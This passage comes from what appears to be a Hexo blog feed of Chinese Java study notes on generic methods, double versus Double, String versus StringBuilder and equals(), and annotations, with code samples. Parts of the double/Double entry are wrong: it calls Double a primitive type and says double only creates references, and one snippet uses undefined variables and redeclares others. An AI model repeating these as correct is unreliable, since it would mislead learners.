，来声明这是一个泛型方法，持有一个泛型T，然后才可以用泛型T作为方法的返回值。</p><p>为什么要用变量c来创建对象呢？<br>既然是泛型方法，就代表着我们不知道具体的类型是什么，也不知道构造方法如何，因此没有办法去new一个对象，但可以利用变量c的newInstance方法去创建对象，也就是利用反射创建对象。</p><p>泛型方法要求的参数是Class&lt;T&gt;类型，而Class.forName()方法的返回值也是Class&lt;T&gt;，因此可以用Class.forName()作为参数。其中，forName()方法中的参数是何种类型，返回的Class&lt;T&gt;就是何种类型。在本例中，forName()方法中传入的是User类的完整路径，因此返回的是Class&lt;User&gt;类型的对象，因此调用泛型方法时，变量c的类型就是Class&lt;User&gt;，因此泛型方法中的泛型T就被指明为User，因此变量obj的类型为User。泛型方法不是仅仅可以有一个参数Class&lt;T&gt;，可以根据需要添加其他参数。</p><h3 id="4-1-类中的泛型方法"><a href="#4-1-类中的泛型方法" class="headerlink" title="4.1 类中的泛型方法"></a>4.1 类中的泛型方法</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//==================================================//</span><br><span class="hljs-keyword">package</span> com.generics;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/4 16:39</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Gener</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">tesad</span><span class="hljs-params">(T t)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> t;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//==================================================//</span><br><span class="hljs-keyword">package</span> com.generics;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/4 16:15</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestGenMethod</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        Gener gg = <span class="hljs-keyword">new</span> Gener();<br>        System.out.println(gg.tesad(<span class="hljs-string">&quot;werewrer&quot;</span>));<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-double与Double的区别</title>
    <link href="/2021/08/04/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-double%E4%B8%8EDouble%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2021/08/04/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-double%E4%B8%8EDouble%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><blockquote><ol><li>数据类型。double是基本数据类型，Double是原始数据类型。Double是java定义的类，而double是预定义数据类型（8种中的一种）</li></ol></blockquote><blockquote><ol start="2"><li>存放位置。double存放在栈中，Double存放在堆中。</li></ol></blockquote><blockquote><ol start="3"><li>属性与方法。double没有方法，Double有自己的属性和方法。</li></ol></blockquote><blockquote><ol start="4"><li>其他：</li></ol></blockquote><ul><li><p>double只创建引用，Double创建对象。hashCode只能做用于对象。</p></li><li><p>集合类不能存放double，只能存放Double。</p></li><li><p>栈的存取速度要高于堆，另外栈中的数据可以共享。</p></li><li><p>从效率来讲用double合适，而Double提供的属性和方法会使操作各种操作更加方便和灵活。</p></li><li><p>Double就好比是对double类型的封装，内置很多方法可以实现String到double的转换，以及获取各种double类型的属性值（MAX_VALUE、SIZE等等）。</p></li></ul><h2 id="1-数据的共享"><a href="#1-数据的共享" class="headerlink" title="1.数据的共享"></a>1.数据的共享</h2><p>数据共享，如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// double</span><br><span class="hljs-keyword">double</span> a = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">double</span> b = <span class="hljs-number">0</span>;<br><span class="hljs-comment">//不会创建对象，只会建立两个引用，同时指向变量“0”（栈数据共享）</span><br><br><span class="hljs-comment">// Double</span><br>Double a = <span class="hljs-keyword">new</span> Double(<span class="hljs-number">0</span>);<br>Double b = <span class="hljs-keyword">new</span> Double(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//会创建两个对象，即使对象所代表的值一样（堆数据不共享）</span><br>System.out.println(mdd==midd); <span class="hljs-comment">//false ,==符号比较的是地址，equals比较的是值</span><br><br><span class="hljs-comment">//示例</span><br><span class="hljs-keyword">double</span> a = <span class="hljs-number">1.0</span>;<br><span class="hljs-keyword">double</span> b = <span class="hljs-number">1.0</span>;<br>Double c = <span class="hljs-number">1.0</span>;<br>Double d = <span class="hljs-number">1.0</span>;<br>System.out.println(a == b);  <span class="hljs-comment">// true</span><br>System.out.println(c == d);  <span class="hljs-comment">// false</span><br></code></pre></div></td></tr></table></figure><blockquote><p>double定义的不能为NULL，Double是可以为NULL的。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> qw = <span class="hljs-keyword">null</span>; <span class="hljs-comment">//报错</span><br>Double qqw = <span class="hljs-keyword">null</span>;<br></code></pre></div></td></tr></table></figure><h2 id="2-计算哈希值"><a href="#2-计算哈希值" class="headerlink" title="2.计算哈希值"></a>2.计算哈希值</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">double</span> ew = <span class="hljs-number">234.324</span>;<br><span class="hljs-comment">// 1.直接计算hash值</span><br>System.out.println(Double.hashCode(ew));<br><span class="hljs-comment">// 2.先将double转化为Double，再求hash值</span><br>Double re = <span class="hljs-keyword">new</span> Double(ew); <span class="hljs-comment">// double转化为Double</span><br>System.out.println(re);<br>System.out.println(re.hashCode());<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-number">1968322224</span><br><span class="hljs-number">234.324</span><br><span class="hljs-number">1968322224</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-String与StringBuilder</title>
    <link href="/2021/08/03/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-String%E4%B8%8EStringBuilder/"/>
    <url>/2021/08/03/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-String%E4%B8%8EStringBuilder/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-String与StringBuilder相互转化"><a href="#1-String与StringBuilder相互转化" class="headerlink" title="1.String与StringBuilder相互转化"></a>1.String与StringBuilder相互转化</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String ss = <span class="hljs-string">&quot;abcder&quot;</span>;<br>StringBuilder sbs = <span class="hljs-keyword">new</span> StringBuilder(ss); <span class="hljs-comment">//String转换为StringBuffer</span><br>StringBuilder resbs = sbs.reverse();<br>String news = resbs.toString(); <span class="hljs-comment">//StringBuffer转换为String</span><br>System.out.println(news);<br></code></pre></div></td></tr></table></figure><h2 id="2-重写equals比较方法"><a href="#2-重写equals比较方法" class="headerlink" title="2.重写equals比较方法"></a>2.重写equals比较方法</h2><p>java中所有的对象都默认继承自Object类，所以当我们没有重写equals的方法时，若使用equals来判断两个对象的是否相等时，只有这两个对象指向的是同一个内存地址时，才会返回true，否则即使内容完全相同但在内存中是两个不同的内存地址也是返回false。StringBuilder没有重写equals方法，所以比较判断的是地址。而String的equals与==的比较结果却不一样。</p><blockquote><ol><li>String的equals函数</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object anObject)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> == anObject) &#123; <span class="hljs-comment">//首先判断其内存地址是否为同一个</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        <span class="hljs-comment">//再判断其内容是否相同</span><br>        <span class="hljs-keyword">if</span> (anObject <span class="hljs-keyword">instanceof</span> String) &#123;<br>            String anotherString = (String) anObject;<br>            <span class="hljs-keyword">int</span> n = value.length;<br>            <span class="hljs-keyword">if</span> (n == anotherString.value.length) &#123;<br>                <span class="hljs-keyword">char</span> v1[] = value;<br>                <span class="hljs-keyword">char</span> v2[] = anotherString.value;<br>                <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">while</span> (n-- != <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (v1[i] != v2[i])<br>                            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>                    i++;<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>Object的equals函数</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">this</span> == obj);<br>    &#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础学习-注解</title>
    <link href="/2021/08/03/JAVA/JAVA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E6%B3%A8%E8%A7%A3/"/>
    <url>/2021/08/03/JAVA/JAVA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E6%B3%A8%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>Java 注解（Annotation）又称 Java 标注，是 JDK5.0 引入的一种注释机制。Java 语言中的类、方法、变量、参数和包等都可以被标注。和 Javadoc 不同，Java 标注可以通过反射获取标注内容。在编译器生成类文件时，标注可以被嵌入到字节码中。Java 虚拟机可以保留标注内容，在运行时可以获取到标注内容 。 当然它也支持自定义 Java 标注。Java 定义了一套注解，共有 7 个，3 个在 java.lang 中，剩下 4 个在 java.lang.annotation 中。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-内置注解"><a href="#1-内置注解" class="headerlink" title="1.内置注解"></a>1.内置注解</h2><blockquote><ol><li>@Override。定义在 java.lang.Override 中，此注释只使用与修辞方法，表示一个方法声明打算重写超类（父类）中的另一个方法声明。检查该方法是否是重写方法。如果发现其父类，或者是引用的接口中并没有该方法时，会报编译错误。</li></ol></blockquote><blockquote><ol start="2"><li>@Deprecated。定义在 java.lang.Deprecated 中， 标记过时方法。如果使用该方法，会报编译警告。了解即可。</li></ol></blockquote><blockquote><ol start="3"><li>@SuppressWarnings。定义在 java.lang.SuppressWarnings 中，指示编译器去忽略注解中声明的警告。与前面不同的是，需要添加一个参数才能正确使用。</li></ol></blockquote><ul><li><p>@SuppressWarnings(“all”)</p></li><li><p>@SuppressWarnings(“unchecked”)</p></li><li><p>@SuppressWarnings(value={“unchecked”,”deprecation”})</p></li><li><p>等等··</p></li></ul><h2 id="2-元注解"><a href="#2-元注解" class="headerlink" title="2.元注解"></a>2.元注解</h2><p>元注解的作用就是负责注解其他注解。</p><blockquote><ol><li><code>@Retention</code> - 标识这个注解怎么保存，是只在代码中，还是编入class文件中，或者是在运行时可以通过反射访问。runtime &gt; class &gt; sources 。表示需要在什么级别保存该注释信息，用于描述注解的生命周期。</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.annotation;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">RetentionPolicy</span> </span>&#123;<br>    SOURCE,            <span class="hljs-comment">/* Annotation信息仅存在于编译器处理期间，编译器处理完之后就没有该Annotation信息了  */</span><br><br>    CLASS,             <span class="hljs-comment">/* 编译器将Annotation存储于类对应的.class文件中。默认行为  */</span><br><br>    RUNTIME            <span class="hljs-comment">/* 编译器将Annotation存储于class文件中，并且可由JVM读入 */</span><br>&#125;<br><br><span class="hljs-comment">//示例</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span> <br><span class="hljs-meta">@Retention(RetentionPolicy.CLASS)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.SOURCE)</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>@Documented - 标记这些注解是否包含在用户文档（javadoc）中。</li></ol></blockquote><blockquote><ol start="3"><li><code>@Target</code> - 标记这个注解应该是哪种 Java 成员、用于哪些地方。是用于方法、字段、还是用于类等等。</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.annotation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">ElementType</span> </span>&#123;<br>    TYPE,               <span class="hljs-comment">/* 类、接口（包括注释类型）或枚举声明  */</span><br><br>    FIELD,              <span class="hljs-comment">/* 字段声明（包括枚举常量）  */</span><br><br>    METHOD,             <span class="hljs-comment">/* 方法声明  */</span><br><br>    PARAMETER,          <span class="hljs-comment">/* 参数声明  */</span><br><br>    CONSTRUCTOR,        <span class="hljs-comment">/* 构造方法声明  */</span><br><br>    LOCAL_VARIABLE,     <span class="hljs-comment">/* 局部变量声明  */</span><br><br>    ANNOTATION_TYPE,    <span class="hljs-comment">/* 注释类型声明  */</span><br><br>    PACKAGE             <span class="hljs-comment">/* 包声明  */</span><br>      <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Type parameter declaration</span><br><span class="hljs-comment">     *类型参数声明</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> 1.8</span><br><span class="hljs-comment">     */</span><br>    TYPE_PARAMETER,<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Use of a type</span><br><span class="hljs-comment">     *类型的使用</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@since</span> 1.8</span><br><span class="hljs-comment">     */</span><br>    TYPE_USE<br>&#125;<br><br><span class="hljs-comment">//示例</span><br><span class="hljs-meta">@Target(&#123;ElementType.TYPE,ElementType.METHOD&#125;)</span> <br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>@Inherited - 标记这个注解是继承于哪个注解类(默认 注解并没有继承于任何子类)。子类可以继承父类的注解。</li></ol></blockquote><p>从 Java 7 开始，额外添加了 3 个注解:</p><ul><li><p>@SafeVarargs - Java 7 开始支持，忽略任何使用参数为泛型变量的方法或构造函数调用产生的警告。</p></li><li><p>@FunctionalInterface - Java 8 开始支持，标识一个匿名函数或函数式接口。</p></li><li><p>@Repeatable - Java 8 开始支持，标识某注解可以在同一个声明上使用多次。</p></li></ul><h2 id="3-自定义注解"><a href="#3-自定义注解" class="headerlink" title="3.自定义注解"></a>3.自定义注解</h2><p>使用 <code>@interface</code> 自定义注解。自动继承了 java.lang.annotation.Annotation 接口。</p><p>分析：</p><ul><li><p>格式：public  @interface 注解名{定义内容} 。如果是在一个类里面声明则将public去掉。</p></li><li><p>可以通过 default 来声明参数的默认值。</p></li><li><p>如果只有一个参数成员，一般参数名为 value 。</p></li><li><p>注解的参数：参数类型 + 参数名(); </p></li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//只有一个参数时</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/3 18:03</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">interfaceTest</span> </span>&#123;<br>    <span class="hljs-meta">@myin(name = &quot;tothefor&quot;)</span> <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> dragonone</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Target(&#123;ElementType.TYPE,ElementType.METHOD&#125;)</span> <span class="hljs-comment">//可以作用于类、方法</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span> <span class="hljs-comment">//在运行时</span><br><span class="hljs-meta">@interface</span> myin&#123;<br>    <span class="hljs-function">String <span class="hljs-title">name</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">//如果只有一个参数，则可以写成value。</span><br>&#125;<br><br><span class="hljs-comment">/*------------------------------------------------------*/</span><br><br><span class="hljs-comment">//只有一个参数，且参数名为value</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/3 18:03</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">interfaceTest</span> </span>&#123;<br>    <span class="hljs-meta">@myin(&quot;tothefor&quot;)</span> <span class="hljs-comment">//因为参数名为value，所以可以直接写”tothefor“。只能是value，其他的不行</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> dragonone</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Target(&#123;ElementType.TYPE,ElementType.METHOD&#125;)</span> <span class="hljs-comment">//可以作用于类、方法</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span> <span class="hljs-comment">//在运行时</span><br><span class="hljs-meta">@interface</span> myin&#123;<br>    <span class="hljs-function">String <span class="hljs-title">value</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-1-参数添加默认值"><a href="#3-1-参数添加默认值" class="headerlink" title="3.1 参数添加默认值"></a>3.1 参数添加默认值</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/3 18:03</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">interfaceTest</span> </span>&#123;<br>    <span class="hljs-meta">@myin()</span> <span class="hljs-comment">//有了默认值就可以不用写，也可以写</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> dragonone</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Target(&#123;ElementType.TYPE,ElementType.METHOD&#125;)</span> <span class="hljs-comment">//可以作用于类、方法</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span> <span class="hljs-comment">//在运行时</span><br><span class="hljs-meta">@interface</span> myin&#123;<br>    <span class="hljs-function">String <span class="hljs-title">value</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> &quot;&quot;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-2-数组参数"><a href="#3-2-数组参数" class="headerlink" title="3.2 数组参数"></a>3.2 数组参数</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/3 18:03</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">interfaceTest</span> </span>&#123;<br>    <span class="hljs-meta">@myin(name=&#123;&quot;dfwef&quot;,&quot;dfwef&quot;&#125;)</span> <span class="hljs-comment">//有默认值可以写，也可以不用写。</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> dragonone</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Target(&#123;ElementType.TYPE,ElementType.METHOD&#125;)</span> <span class="hljs-comment">//可以作用于类、方法</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span> <span class="hljs-comment">//在运行时</span><br><span class="hljs-meta">@interface</span> myin&#123;<br>    String[] name() <span class="hljs-keyword">default</span> &#123;<span 